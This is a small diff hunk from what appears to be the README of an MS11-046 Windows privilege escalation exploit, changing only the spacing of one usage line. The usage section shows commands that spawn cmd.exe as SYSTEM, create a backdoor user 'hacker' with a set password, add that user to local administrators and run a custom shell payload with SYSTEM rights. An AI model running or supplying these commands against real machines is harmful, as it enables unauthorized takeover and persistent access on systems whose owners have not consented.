@@ -59,7 +59,7 @@ i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
 ## Usage
 
 ```
-ms11-046.exe                                              # default: spawns cmd.exe as SYSTEM
+ms11-046.exe                                             # default: spawns cmd.exe as SYSTEM
 ms11-046.exe "net user hacker Pass123! /add"             # add a user as SYSTEM
 ms11-046.exe "net localgroup administrators hacker /add" # add to local admins
 ms11-046.exe "c:\windows\temp\shell.exe"                 # run a custom payload as SYSTEM
